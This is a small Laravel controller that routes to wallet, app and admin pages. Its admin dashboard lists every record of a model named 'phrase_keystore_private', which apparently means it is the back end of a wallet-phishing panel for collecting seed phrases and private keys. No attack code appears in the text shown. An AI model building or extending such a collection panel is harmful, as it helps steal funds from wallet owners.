<?php

namespace App\Http\Controllers;

use App\Models\phrase_keystore_private;
use Illuminate\Http\Request;

class ViewController extends Controller
{
    public function mainView(){
        return view('index');
    } 
    public function WalletView(){
        return view('all_wallet');
    } 
    public function appView(){
        return view('app');
    }
    
    public function viewAdmin(){
        return view('admin.sign_up');
    } 
    public function viewAdminLoging(){
        return view('admin.sign_in');
    }

    public function adminView(){

        $details = phrase_keystore_private::all();
        return view('admin.dashboard', ['details'=> $details]);
    }

    public function passwordView(){
        return view('admin.password_reset');
    }
}
